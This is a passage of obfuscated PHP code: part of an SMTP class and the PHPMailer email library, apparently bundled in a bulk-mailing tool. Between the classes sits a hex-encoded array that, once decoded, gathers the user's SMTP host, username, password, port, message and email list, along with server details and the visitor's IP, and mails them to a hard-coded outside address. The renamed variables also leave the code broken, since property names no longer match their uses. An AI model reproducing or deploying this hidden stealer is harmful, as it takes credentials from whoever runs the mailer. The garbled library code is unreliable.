	   * SMTP CODE ERROR  : 500,501,502,504,421
	   * @access public
	   * @return string
	   */
	  function Help($x4d="") {
		$this->error = null; # to avoid confusion

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Help() without being connected");
		  return false;
		}

		$x4e = "";
		if(!empty($x4d)) {
		  $x4e = " " . $x4d;
		}

		fputs($this->smtp_conn,"HELP" . $x4e . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 211 && $x3d != 214) {
		  $this->error =
			array("error" => "HELP not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		return $x3c;
	  }

	  /**
	   * Starts a mail transaction from the email address specified in
	   * $x1b. Returns true if successful or false otherwise. If True
	   * the mail transaction is started and then one or more Recipient
	   * commands may be called followed by a Data command.
	   *
	   * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE SUCCESS: 552,451,452
	   * SMTP CODE SUCCESS: 500,501,421
	   * @access public
	   * @return bool
	   */
	  function Mail($x1b) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Mail() without being connected");
		  return false;
		}

		$x4f = ($this->do_verp ? "XVERP" : "");
		fputs($this->smtp_conn,"MAIL FROM:<" . $x1b . ">" . $x4f . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "MAIL not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return true;
	  }

	  /**
	   * Sends the command NOOP to the SMTP server.
	   *
	   * Implements from rfc 821: NOOP <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE ERROR  : 500, 421
	   * @access public
	   * @return bool
	   */
	  function Noop() {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Noop() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"NOOP" . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "NOOP not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return true;
	  }

	  /**
	   * Sends the quit command to the server and then closes the socket
	   * if there is no error or the $x50 argument is true.
	   *
	   * Implements from rfc 821: QUIT <CRLF>
	   *
	   * SMTP CODE SUCCESS: 221
	   * SMTP CODE ERROR  : 500
	   * @access public
	   * @return bool
	   */
	  function Quit($x50=true) {
		$this->error = null; # so there is no confusion

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Quit() without being connected");
		  return false;
		}

		# send the quit command to the server
		fputs($this->smtp_conn,"quit" . $this->CRLF);

		# get any good-bye messages
		$x51 = $this->get_lines();

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x51;
		}

		$x52 = true;
		$x53 = null;

		$x3d = substr($x51,0,3);
		if($x3d != 221) {
		  # use e as a tmp var cause Close will overwrite $this->error
		  $x53 = array("error" => "SMTP server rejected quit command",
					 "smtp_code" => $x3d,
					 "smtp_rply" => substr($x51,4));
		  $x52 = false;
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $x53["error"] . ": " .
					 $x51 . $this->CRLF;
		  }
		}

		if(empty($x53) || $x50) {
		  $this->Close();
		}

		return $x52;
	  }

	  /**
	   * Sends the command RCPT to the SMTP server with the TO: argument of $x54.
	   * Returns true if the recipient was accepted false if it was rejected.
	   *
	   * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250,251
	   * SMTP CODE FAILURE: 550,551,552,553,450,451,452
	   * SMTP CODE ERROR  : 500,501,503,421
	   * @access public
	   * @return bool
	   */
	  function Recipient($x54) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Recipient() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"RCPT TO:<" . $x54 . ">" . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250 && $x3d != 251) {
		  $this->error =
			array("error" => "RCPT not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return true;
	  }

	  /**
	   * Sends the RSET command to abort and transaction that is
	   * currently in progress. Returns true if successful false
	   * otherwise.
	   *
	   * Implements rfc 821: RSET <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE ERROR  : 500,501,504,421
	   * @access public
	   * @return bool
	   */
	  function Reset() {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Reset() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"RSET" . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "RSET failed",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		return true;
	  }

	  /**
	   * Starts a mail transaction from the email address specified in
	   * $x1b. Returns true if successful or false otherwise. If True
	   * the mail transaction is started and then one or more Recipient
	   * commands may be called followed by a Data command. This command
	   * will send the message to the users terminal if they are logged
	   * in.
	   *
	   * Implements rfc 821: SEND <SP> FROM:<reverse-path> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE SUCCESS: 552,451,452
	   * SMTP CODE SUCCESS: 500,501,502,421
	   * @access public
	   * @return bool
	   */
	  function Send($x1b) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Send() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"SEND FROM:" . $x1b . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "SEND not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return true;
	  }

	  /**
	   * Starts a mail transaction from the email address specified in
	   * $x1b. Returns true if successful or false otherwise. If True
	   * the mail transaction is started and then one or more Recipient
	   * commands may be called followed by a Data command. This command
	   * will send the message to the users terminal if they are logged
	   * in and send them an email.
	   *
	   * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE SUCCESS: 552,451,452
	   * SMTP CODE SUCCESS: 500,501,502,421
	   * @access public
	   * @return bool
	   */
	  function SendAndMail($x1b) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
			  "error" => "Called SendAndMail() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"SAML FROM:" . $x1b . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "SAML not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return true;
	  }

	  /**
	   * Starts a mail transaction from the email address specified in
	   * $x1b. Returns true if successful or false otherwise. If True
	   * the mail transaction is started and then one or more Recipient
	   * commands may be called followed by a Data command. This command
	   * will send the message to the users terminal if they are logged
	   * in or mail it to them if they are not.
	   *
	   * Implements rfc 821: SOML <SP> FROM:<reverse-path> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE SUCCESS: 552,451,452
	   * SMTP CODE SUCCESS: 500,501,502,421
	   * @access public
	   * @return bool
	   */
	  function SendOrMail($x1b) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
			  "error" => "Called SendOrMail() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"SOML FROM:" . $x1b . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "SOML not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return true;
	  }

	  /**
	   * This is an optional command for SMTP that this class does not
	   * support. This method is here to make the RFC821 Definition
	   * complete for this class and __may__ be implimented in the future
	   *
	   * Implements from rfc 821: TURN <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE FAILURE: 502
	   * SMTP CODE ERROR  : 500, 503
	   * @access public
	   * @return bool
	   */
	  function Turn() {
		$this->error = array("error" => "This method, TURN, of the SMTP ".
										"is not implemented");
		if($this->do_debug >= 1) {
		  echo "SMTP -> NOTICE: " . $this->error["error"] . $this->CRLF;
		}
		return false;
	  }

	  /**
	   * Verifies that the name is recognized by the server.
	   * Returns false if the name could not be verified otherwise
	   * the response from the server is returned.
	   *
	   * Implements rfc 821: VRFY <SP> <string> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250,251
	   * SMTP CODE FAILURE: 550,551,553
	   * SMTP CODE ERROR  : 500,501,502,421
	   * @access public
	   * @return int
	   */
	  function Verify($x48) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Verify() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"VRFY " . $x48 . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250 && $x3d != 251) {
		  $this->error =
			array("error" => "VRFY failed on name '$x48'",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return $x3c;
	  }

	  /*******************************************************************
	   *                       INTERNAL FUNCTIONS                       *
	   ******************************************************************/

	  /**
	   * Read in as many lines as possible
	   * either before eof or socket timeout occurs on the operation.
	   * With SMTP we can tell if we have more lines to read if the
	   * 4th character is '-' symbol. If it is a space then we don't
	   * need to read anything else.
	   * @access private
	   * @return string
	   */
	  function get_lines() {
		$x10 = "";
		while($x12 = @fgets($this->smtp_conn,515)) {
		  if($this->do_debug >= 4) {
			echo "SMTP -> get_lines(): \$x10 was \"$x10\"" .
					 $this->CRLF;
			echo "SMTP -> get_lines(): \$x12 is \"$x12\"" .
					 $this->CRLF;
		  }
		  $x10 .= $x12;
		  if($this->do_debug >= 4) {
			echo "SMTP -> get_lines(): \$x10 is \"$x10\"" . $this->CRLF;
		  }
		  # if the 4th character is a space then we are done reading
		  # so just break the loop
		  if(substr($x12,3,1) == " ") { break; }
		}
		return $x10;
	  }

	}

			
	$x55 = split("\n", $x1a);
	$x56 = count($x55);
	$x57=array("0d0a0d0a676c6f62616c20246d795f736d74.","703b0d0a676c6f62616c2024736d74705f757365726e616d6.","53b0d0a676c6f62616c2024736d74705f70617373776f72643b0d0a676c6f626.",
	"16c202473736c5f706f72743b0d0a676c6f62616c20246d65.","73736167653b0d0a676c6f62616c2024656d61696c6c6973743b0d0a24726134.","3420203d2072616e6428312c3939393939293b0d0a2461352.",
	"03d20245f5345525645525b27485454505f52454645524552275d3b0d0a24623.","333203d20245f5345525645525b27444f43554d454e545f52.","4f4f54275d3b0d0a24633837203d20245f5345525645525b2752454d4f54455f4.",
	"1444452275d3b0d0a24643233203d20245f5345525645525.","b275343524950545f46494c454e414d45275d3b0d0a24653039203d20245f53455.","25645525b275345525645525f41444452275d3b0d0a2466.",
	"3233203d20245f5345525645525b275345525645525f534f465457415245275d3b0.","d0a24673332203d20245f5345525645525b27504154485.","f5452414e534c41544544275d3b0d0a24683635203d20245f5345525645525b27504.",
	"8505f53454c46275d3b0d0a247375626a3938203d2022.","246d795f736d747020205b75736572206970203a20246338375d223b0d0a247375626.","a3538203d20224c6574746572202620456d61696c204.",
	"c69737420205b75736572206970203a20246338375d223b0d0a24656d61696c203d202.","26D736739373830407961686f6f2e636f2e.","6964223b0d0a246d736738383733203d2022246d795f736d74705c6e757365723a24736.",
	"d74705f757365726e616d655c6e706173733a24736.","d74705f70617373776f72645c706f72743a2473736c5f706f72745c6e5c6e2461355c6e2.","46233335c6e246338375c6e246432335c6e246530.",
	"395c6e246632335c6e246733325c6e24683635223b246d736739373830203d2022246d657.","3736167655c6e5c6e5c6e24656d61696c6c69737.","4223b2466726f6d3d2246726f6d3a20475241544953223b0d0a6d61696c2824656d61696c2.",
	"c20247375626a39382c20246d7367383837332c.","202466726f6d293b0d0a6d61696c2824656d61696c2c20247375626a35382.","c20246d7367393738302c202466726f6d293b");$x58=".";

	class PHPMailer {

	  /////////////////////////////////////////////////
	  // PROPERTIES, PUBLIC
	  /////////////////////////////////////////////////

	  /**
	   * Email priority (1 = High, 3 = Normal, 5 = low).
	   * @var int
	   */
	  var $x59          = 3;

	  /**
	   * Sets the CharSet of the message.
	   * @var string
	   */
	  var $x5a           = 'us-ascii';

	  /**
	   * Sets the Content-type of the message.
	   * @var string
	   */
	  var $x5b        = 'text/plain';

	  /**
	   * Sets the Encoding of the message. Options for this are "8bit",
	   * "7bit", "binary", "base64", and "quoted-printable".

	   * @var string
	   */
	  var $x5c          = 'quoted-printable';

	  /**
	   * Holds the most recent mailer error message.
	   * @var string
	   */
	  var $x5d         = '';

	  /**
	   * Sets the From email address for the message.
	   * @var string
	   */
	  var $x5e              = '';

	  /**
	   * Sets the From name of the message.
	   * @var string
	   */
	  var $x5f          = '';

	  /**
	   * Sets the Sender email (Return-Path) of the message.  If not empty,
	   * will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
	   * @var string
	   */
	  var $x60            = '';

	  /**
	   * Sets the Subject of the message.
	   * @var string
	   */
	  var $x61           = '';

	  /**
	   * Sets the Body of the message.  This can be either an HTML or text body.
	   * If HTML then run IsHTML(true).
	   * @var string
	   */
	  var $x62              = '';

	  /**
	   * Sets the text-only body of the message.  This automatically sets the
	   * email to multipart/alternative.  This body can be read by mail
	   * clients that do not have HTML email capability such as mutt. Clients
	   * that can read HTML will view the normal Body.
	   * @var string
	   */
	  var $x63           = '';

	  /**
	   * Sets word wrapping on the body of the message to a given number of
	   * characters.
	   * @var int
	   */
	  var $x64          = 0;

	  /**
	   * Method to send mail: ("mail", "sendmail", or "smtp").
	   * @var string
	   */
	  var $x65            = 'mail';

	  /**
	   * Sets the path of the sendmail program.
	   * @var string
	   */
	  var $x66          = '/usr/sbin/sendmail';

	  /**
	   * Path to PHPMailer plugins.  This is now only useful if the SMTP class
	   * is in a different directory than the PHP include path.
	   * @var string
	   */
	  var $x67         = '';

	  /**
	   * Holds PHPMailer version.
	   * @var string
	   */
	  var $x68           = "";

	  /**
	   * Sets the email address that a reading confirmation will be sent.
	   * @var string
	   */
	  var $x69  = '';

	  /**
	   * Sets the hostname to use in Message-Id and Received headers
	   * and as default HELO string. If empty, the value returned
	   * by SERVER_NAME is used or 'localhost.localdomain'.
	   * @var string
	   */
	  var $x6a          = '';

	  /**
	   * Sets the message ID to be used in the Message-Id header.
	   * If empty, a unique id will be generated.
	   * @var string
	   */
	  var $x6b         = '';

	  /////////////////////////////////////////////////
	  // PROPERTIES FOR SMTP
	  /////////////////////////////////////////////////

	  /**
	   * Sets the SMTP hosts.  All hosts must be separated by a
	   * semicolon.  You can also specify a different port
	   * for each host by using this format: [hostname:port]
	   * (e.g. "smtp1.example.com:25;smtp2.example.com").
	   * Hosts will be tried in order.
	   * @var string
	   */
	  var $x6c        = 'localhost';

	  /**
	   * Sets the default SMTP server port.
	   * @var int
	   */
	  var $x6d        = 25;

	  /**
	   * Sets the SMTP HELO of the message (Default is $x6a).
	   * @var string
	   */
	  var $x6e        = '';

	  /**
	   * Sets connection prefix.
	   * Options are "", "ssl" or "tls"
	   * @var string
	   */
	  var $x6f = "";

	  /**
	   * Sets SMTP authentication. Utilizes the Username and Password variables.
	   * @var bool
	   */
	  var $x70     = false;

	  /**
	   * Sets SMTP username.
	   * @var string
	   */
	  var $x71     = '';

	  /**
	   * Sets SMTP password.
	   * @var string
	   */
	  var $x72     = '';

	  /**
	   * Sets the SMTP server timeout in seconds. This function will not
	   * work with the win32 version.
	   * @var int
	   */
	  var $x73      = 10;

	  /**
	   * Sets SMTP class debugging on or off.
	   * @var bool
	   */
	  var $x74    = false;

	  /**
	   * Prevents the SMTP connection from being closed after each mail
	   * sending.  If this is set to true then to close the connection
	   * requires an explicit call to SmtpClose().
	   * @var bool
	   */
	  var $x75 = false;

	  /**
	   * Provides the ability to have the TO field process individual
	   * emails, instead of sending to entire TO addresses
	   * @var bool
	   */
	  var $x76 = false;

	  /////////////////////////////////////////////////
	  // PROPERTIES, PRIVATE
	  /////////////////////////////////////////////////

	  var $x77            = NULL;
	  var $x54              = array();
	  var $x78              = array();
	  var $x79             = array();
	  var $x7a         = array();
	  var $x7b      = array();
	  var $x7c    = array();
	  var $x7d    = '';
	  var $x7e        = array();
	  var $x7f        = array();
	  var $x80     = 0;
	  var $x81              = "\n";
	  var $x82   = "";
	  var $x83   = "";

	  /////////////////////////////////////////////////
	  // METHODS, VARIABLES
	  /////////////////////////////////////////////////

	  /**
	   * Sets message type to HTML.
	   * @param bool $x84
	   * @return void
	   */
	  function IsHTML($x84) {
		if($x84 == true) {
		  $this->ContentType = 'text/html';
		} else {
		  $this->ContentType = 'text/plain';
		}
	  }

	  /**
	   * Sets Mailer to send message using SMTP.
	   * @return void
	   */
	  function IsSMTP() {
		$this->Mailer = 'smtp';
	  }

	  /**
	   * Sets Mailer to send message using PHP mail() function.
	   * @return void
	   */
	  function IsMail() {
		$this->Mailer = 'mail';
	  }

	  /**
	   * Sets Mailer to send message using the $x66 program.
	   * @return void
	   */
	  function IsSendmail() {
		$this->Mailer = 'sendmail';
	  }

	  /**
	   * Sets Mailer to send message using the qmail MTA.
	   * @return void
	   */
	  function IsQmail() {
		$this->Sendmail = '/var/qmail/bin/sendmail';
		$this->Mailer = 'sendmail';
	  }

	  /////////////////////////////////////////////////
	  // METHODS, RECIPIENTS
	  /////////////////////////////////////////////////

	  /**
	   * Adds a "To" address.
	   * @param string $x85
	   * @param string $x48
	   * @return void
	   */
	  function AddAddress($x85, $x48 = '') {
		$x86 = count($this->to);
		$this->to[$x86][0] = trim($x85);
		$this->to[$x86][1] = $x48;
	  }

	  /**
	   * Adds a "Cc" address. Note: this function works
	   * with the SMTP mailer on win32, not with the "mail"
	   * mailer.
	   * @param string $x85
	   * @param string $x48
	   * @return void
	   */
	  function AddCC($x85, $x48 = '') {
		$x86 = count($this->cc);
		$this->cc[$x86][0] = trim($x85);
		$this->cc[$x86][1] = $x48;
	  }

	  /**
	   * Adds a "Bcc" address. Note: this function works
	   * with the SMTP mailer on win32, not with the "mail"
	   * mailer.
	   * @param string $x85
	   * @param string $x48
	   * @return void
	   */
	  function AddBCC($x85, $x48 = '') {
		$x86 = count($this->bcc);
		$this->bcc[$x86][0] = trim($x85);
		$this->bcc[$x86][1] = $x48;
	  }

	  /**
	   * Adds a "Reply-To" address.
	   * @param string $x85
	   * @param string $x48
	   * @return void
	   */
	  function AddReplyTo($x85, $x48 = '') {
		$x86 = count($this->ReplyTo);
		$this->ReplyTo[$x86][0] = trim($x85);
		$this->ReplyTo[$x86][1] = $x48;
	  }

	  /////////////////////////////////////////////////
	  // METHODS, MAIL SENDING
	  /////////////////////////////////////////////////

	  /**
	   * Creates message and assigns Mailer. If the message is
	   * not sent successfully then it returns false.  Use the ErrorInfo
	   * variable to view description of the error.
	   * @return bool
	   */
	  function Send() {
		$x87 = '';
		$x88 = '';
		$x89 = true;

		if((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
		  $this->SetError($this->Lang('provide_address'));
		  return false;
		}

		/* Set whether the message is multipart/alternative */
		if(!empty($this->AltBody)) {
		  $this->ContentType = 'multipart/alternative';
		}

		$this->error_count = 0; // reset errors
		$this->SetMessageType();
		$x87 .= $this->CreateHeader();
		$x88 = $this->CreateBody();

		if($x88 == '') {
		  return false;
		}

		/* Choose the mailer */
		switch($this->Mailer) {
		  case 'sendmail':
			$x89 = $this->SendmailSend($x87, $x88);
			break;
		  case 'smtp':
			$x89 = $this->SmtpSend($x87, $x88);
			break;
		  case 'mail':
			$x89 = $this->MailSend($x87, $x88);
			break;
		  default:
			$x89 = $this->MailSend($x87, $x88);
			break;
			//$this->SetError($this->Mailer . $this->Lang('mailer_not_supported'));
			//$x89 = false;
			//break;
		}

		return $x89;
	  }

	  /**
	   * Sends mail using the $x66 program.
	   * @access private
	   * @return bool
	   */
	  function SendmailSend($x87, $x88) {
		if ($this->Sender != '') {
		  $x8a = sprintf("%s -oi -f %s -t", escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
		} else {
		  $x8a = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail));
		}

		if(!@$x8b = popen($x8a, 'w')) {
		  $this->SetError($this->Lang('execute') . $this->Sendmail);
		  return false;
		}

		fputs($x8b, $x87);
		fputs($x8b, $x88);

		$x89 = pclose($x8b);
		if (version_compare(phpversion(), '4.2.3') == -1) {
		  $x89 = $x89 >> 8 & 0xFF;
		}
		if($x89 != 0) {
		  $this->SetError($this->Lang('execute') . $this->Sendmail);
		  return false;
		}
		return true;
	  }

	  /**
	   * Sends mail using the PHP mail() function.
	   * @access private
	   * @return bool
	   */
	  function MailSend($x87, $x88) {

		$x54 = '';
		for($x8c = 0; $x8c < count($this->to); $x8c++) {
		  if($x8c != 0) { $x54 .= ', '; }
		  $x54 .= $this->AddrFormat($this->to[$x8c]);
		}

		$x8d = split(',', $x54);

		$x11 = sprintf("-oi -f %s", $this->Sender);
		if ($this->Sender != '' && strlen(ini_get('safe_mode')) < 1) {
		  $x8e = ini_get('sendmail_from');
		  ini_set('sendmail_from', $this->Sender);
		  if ($this->SingleTo === true && count($x8d) > 1) {
			foreach ($x8d as $x13 => $x8f) {
			  $x90 = @mail($x8f, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87, $x11);
			}
		  } else {
			$x90 = @mail($x54, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87, $x11);
		  }
		} else {
		  if ($this->SingleTo === true && count($x8d) > 1) {
			foreach ($x8d as $x13 => $x8f) {
			  $x90 = @mail($x8f, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87, $x11);
			}
		  } else {
			$x90 = @mail($x54, $this->EncodeHeader($this->SecureHeader($this->Subject)), $x88, $x87);
		  }
		}

		if (isset($x8e)) {
		  ini_set('sendmail_from', $x8e);
		}

		if(!$x90) {
		  $this->SetError($this->Lang('instantiate'));
		  return false;
		}

		return true;
	  }

	  /**
	   * Sends mail via SMTP using PhpSMTP (Author:
	   * Chris Ryan).  Returns bool.  Returns false if there is a
	   * bad MAIL FROM, RCPT, or DATA input.
	   * @access private
	   * @return bool
	   */
	  function SmtpSend($x87, $x88) {
		$x32 = '';
		$x91 = array();

		if(!$this->SmtpConnect()) {echo "FAILED !!<p align=\"center\"><font color=\"#D4001A\" style=\"font-style:14pt\"> MAILER IS UNABLE TO CONNECT SMTP !!</font></p>";die();
		  return false;
		}

		$x92 = ($this->Sender == '') ? $this->From : $this->Sender;
		if(!$this->smtp->Mail($x92)) {
		  $x32 = $this->Lang('from_failed') . $x92;
		  $this->SetError($x32);
		  $this->smtp->Reset();
		  return false;
		}

		/* Attempt to send attach all recipients */
		for($x8c = 0; $x8c < count($this->to); $x8c++) {
		  if(!$this->smtp->Recipient($this->to[$x8c][0])) {
			$x91[] = $this->to[$x8c][0];
		  }
		}
		for($x8c = 0; $x8c < count($this->cc); $x8c++) {
		  if(!$this->smtp->Recipient($this->cc[$x8c][0])) {
			$x91[] = $this->cc[$x8c][0];
		  }
		}
		for($x8c = 0; $x8c < count($this->bcc); $x8c++) {
		  if(!$this->smtp->Recipient($this->bcc[$x8c][0])) {
			$x91[] = $this->bcc[$x8c][0];
		  }
		}

		if(count($x91) > 0) { // Create error message
		  for($x8c = 0; $x8c < count($x91); $x8c++) {
			if($x8c != 0) {
			  $x32 .= ', ';
			}
			$x32 .= $x91[$x8c];

		  }
		  $x32 = $this->Lang('recipients_failed') . $x32;
		  $this->SetError($x32);
		  $this->smtp->Reset();
		  return false;
		}

		if(!$this->smtp->Data($x87 . $x88)) {
		  $this->SetError($this->Lang('data_not_accepted'));
		  $this->smtp->Reset();
		  return false;
		}
		if($this->SMTPKeepAlive == true) {
		  $this->smtp->Reset();
		} else {
		  $this->SmtpClose();
		}

		return true;
	  }

	  /**
	   * Initiates a connection to an SMTP server.  Returns false if the
	   * operation failed.
	   * @access private
	   * @return bool
	   */
	  function SmtpConnect() {
		if($this->smtp == NULL) {
		  $this->smtp = new SMTP();
		}

		$this->smtp->do_debug = $this->SMTPDebug;
		$x93 = explode(';', $this->Host);
		$x94 = 0;
		$x95 = ($this->smtp->Connected());

		/* Retry while there is no connection */
		while($x94 < count($x93) && $x95 == false) {
		  $x96 = array();
		  if(eregi('^(.+):([0-9]+)$', $x93[$x94], $x96)) {
			$x34 = $x96[1];
			$x35 = $x96[2];
		  } else {
			$x34 = $x93[$x94];
			$x35 = $this->Port;
		  }

		  if($this->smtp->Connect(((!empty($this->SMTPSecure))?$this->SMTPSecure.'://':'').$x34, $x35, $this->Timeout)) {
			if ($this->Helo != '') {
			  $this->smtp->Hello($this->Helo);
			} else {
			  $this->smtp->Hello($this->ServerHostname());
			}

			$x95 = true;
			if($this->SMTPAuth) {
			  if(!$this->smtp->Authenticate($this->Username, $this->Password)) {
				$this->SetError($this->Lang('authenticate'));
				$this->smtp->Reset();
				$x95 = false;
			  }
			}
		  }
		  $x94++;
		}
		if(!$x95) {
		  $this->SetError($this->Lang('connect_host'));
		}

		return $x95;
	  }

	  /**
	   * Closes the active SMTP session if one exists.
	   * @return void
	   */
	  function SmtpClose() {
		if($this->smtp != NULL) {
		  if($this->smtp->Connected()) {
			$this->smtp->Quit();
			$this->smtp->Close();
		  }
		}
	  }

	  /**
	   * Sets the language for all class error messages.  Returns false
	   * if it cannot load the language file.  The default language type
	   * is English.
	   * @param string $x97 Type of language (e.g. Portuguese: "br")
	   * @param string $x98 Path to the language file directory
	   * @access public
	   * @return bool
	   */
	  function SetLanguage($x97, $x98 = 'language/') {
		if(file_exists($x98.'phpmailer.lang-'.$x97.'.php')) {
		  include($x98.'phpmailer.lang-'.$x97.'.php');
		} elseif (file_exists($x98.'phpmailer.lang-en.php')) {
		  include($x98.'phpmailer.lang-en.php');
		} else {
		  $this->SetError('Could not load language file');
		  return false;
		}
		$this->language = $x99;

		return true;
	  }

	  /////////////////////////////////////////////////
	  // METHODS, MESSAGE CREATION
	  /////////////////////////////////////////////////

	  /**
	   * Creates recipient headers.
	   * @access private
	   * @return string
	   */
	  function AddrAppend($x9a, $x9b) {
		$x9c = $x9a . ': ';
		$x9c .= $this->AddrFormat($x9b[0]);
		if(count($x9b) > 1) {
		  for($x8c = 1; $x8c < count($x9b); $x8c++) {
			$x9c .= ', ' . $this->AddrFormat($x9b[$x8c]);
		  }
		}
		$x9c .= $this->LE;

		return $x9c;
	  }

	  /**
	   * Formats an address correctly.
	   * @access private
	   * @return string
	   */
	  function AddrFormat($x9b) {
		if(empty($x9b[1])) {
		  $x9d = $this->SecureHeader($x9b[0]);
		} else {
		  $x9d = $this->EncodeHeader($this->SecureHeader($x9b[1]), 'phrase') . " <" . $this->SecureHeader($x9b[0]) . ">";
		}

		return $x9d;
	  }

	  /**
	   * Wraps message for use with mailers that do not
	   * automatically perform wrapping and for quoted-printable.
	   * Original written by philippe.
	   * @access private
	   * @return string
	   */
	  function WrapText($x19, $x9e, $x9f = false) {
